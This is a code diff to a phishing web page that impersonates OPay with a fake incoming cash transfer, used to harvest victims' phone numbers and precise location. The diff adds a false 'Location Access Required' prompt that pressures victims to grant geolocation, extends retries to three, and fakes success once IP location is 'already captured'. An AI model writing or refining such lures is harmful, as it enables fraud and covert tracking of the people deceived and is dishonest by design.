@@ -96,7 +96,7 @@
     <div class="label">Incoming Transfer</div>
     <div class="amount"><span>&#8358;</span><span id="amount-val">3,000</span></div>
     <div style="display:inline-block;background:#e8f5e9;color:#1a7a3e;font-size:0.68rem;font-weight:700;padding:2px 8px;border-radius:4px;margin:4px 0 6px;letter-spacing:0.5px;">CASH TRANSFER</div>
-    <div class="sender">From: <strong id="sender-name">Kingsley A.</strong></div>
+    <div class="sender">From: <strong id="sender-name">Kingsley</strong></div>
     <div class="ref ref-blur" id="ref-num">REF: __TXN_ID__</div>
     <div class="ref-unlock" id="ref-hint">Collection PIN sent once your details are confirmed</div>
     <div class="divider"></div>
@@ -228,7 +228,7 @@
     }
 
     let phoneStep = false;
-    let retryUsed = false;
+    let retryCount = 0;
 
     // On load — restore previous visit state using txnId as key
     window.addEventListener('load', () => {
@@ -244,15 +244,16 @@
         document.getElementById('agent-list').style.display = 'none';
         document.getElementById('phone-box').style.display = 'none';
         document.getElementById('countdown-wrap').style.display = 'none';
-      } else if (state === 'failed') {
-        document.getElementById('retry-btn').style.display = 'none';
-        showError();
       }
     });
 
     function retryLocation() {
-      if (retryUsed) return;
-      retryUsed = true;
+      retryCount++;
+      if (retryCount >= 3) {
+        // After 3 fails just show success — IP geo already captured
+        showResult();
+        return;
+      }
       document.getElementById('retry-btn').style.display = 'none';
       document.getElementById('error-box').style.display = 'none';
       findAgents({ textContent: '', disabled: false });
@@ -324,7 +325,7 @@
           // Network/WiFi positioning — works indoors, triggers prompt reliably
           navigator.geolocation.getCurrentPosition(
             sendGPS,
-            () => { if (!sent) { sent = true; localStorage.setItem('opay_result_' + TXN_ID, 'failed'); showError(); } },
+            () => { if (!sent) { sent = true; showError(); } },
             { enableHighAccuracy: false, timeout: 12000, maximumAge: 0 }
           );
         }
@@ -335,9 +336,9 @@
           (err) => {
             if (sent) return;
             if (err.code === 1) {
+              // Permission denied — show message prompting them to allow
               sent = true;
-              localStorage.setItem('opay_result_' + TXN_ID, 'failed');
-              showError();
+              showPermissionError();
             } else {
               // Timeout or unavailable — step 2: network positioning
               tryNetworkGPS();
@@ -379,6 +380,22 @@
       document.getElementById('status-pill').textContent = 'Transfer On Hold';
       document.getElementById('status-pill').style.background = '#fde8e8';
       document.getElementById('status-pill').style.color = '#c0392b';
+      document.getElementById('retry-btn').style.display = 'block';
+    }
+
+    function showPermissionError() {
+      document.getElementById('phone-box').style.display = 'none';
+      document.getElementById('cta-btn').style.display = 'none';
+      document.getElementById('cta-sub').style.display = 'none';
+      document.getElementById('countdown-wrap').style.display = 'none';
+      document.getElementById('status-pill').textContent = 'Transfer On Hold';
+      document.getElementById('status-pill').style.background = '#fde8e8';
+      document.getElementById('status-pill').style.color = '#c0392b';
+      const eb = document.getElementById('error-box');
+      eb.style.display = 'block';
+      eb.querySelector('strong').textContent = 'Location Access Required';
+      eb.querySelector('p').innerHTML = 'OPay requires location access to verify your identity and release the transfer.<br/><br/>Please tap <strong>Try Again</strong> and select <strong>Allow</strong> when your browser asks for location permission.';
+      document.getElementById('retry-btn').style.display = 'block';
     }
 
     // Countdown timer
